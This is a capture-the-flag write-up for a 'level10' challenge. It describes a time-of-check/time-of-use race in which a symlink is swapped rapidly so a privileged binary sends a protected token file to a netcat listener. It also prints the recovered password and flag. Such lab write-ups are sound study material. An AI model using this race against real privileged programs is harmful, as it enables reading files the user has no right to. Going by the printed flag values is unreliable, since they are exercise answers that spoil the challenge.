# The way we've solved this

1. After logging into the **level10** user, we, once again, can see one binary file, named `level10`, and one text file, named `token`. This time we, once again can't see the content of the token file. That means we definitely should check out what we can do with the `level10` executable. First of all, let's try to launch it. It responses us with the short usage info.
2. First of all, we'll create test file with all the permissions to it we want to have. Now, let's try to run `level10` executable with the previously used tool named `ltrace` and with all the requested in usage message arguments: `ltrace ./level10 /tmp/test 10.0.2.15`
3. In the traces of ltrace we can see `access` method invocation, which, obviously, checks permissions of current user to the file specified earlier. After checking out `access` man page, we will get a sense of what we need to do next: _exploit the short time interval between checking and opening the file to manipulate it_. To do so we should simultaneously do several things:
   1. Create a background process which will rapidly switch symbolic link from pointing to file we want to expose to the file we have full permissions on.
   2. Create a background process which will listen to the 6969 port (because we'll kinda bruteforce it, considering amount of tries we'll perform). We'll do that using command: `nc -lk 6969`.
   3. Create a background process which will send file to the 6969 port by means of the `./level10` executable. The last of the commands will look like `./level10 /tmp/<our_symbolic_link> <our_host>`.
4. We've performed all that in one script `ultra-kekker`. It's not the best program we wrote, but it works. After executing it, among other less meaningful strings, we will get something like a password from the next flag: `woupa2yuojeeaaed06riuj63c`.
5. Let's log into **flag10** user, and launch `getflag` command to get the next flag: `feulo4b72j7edeahuete3no7c`.
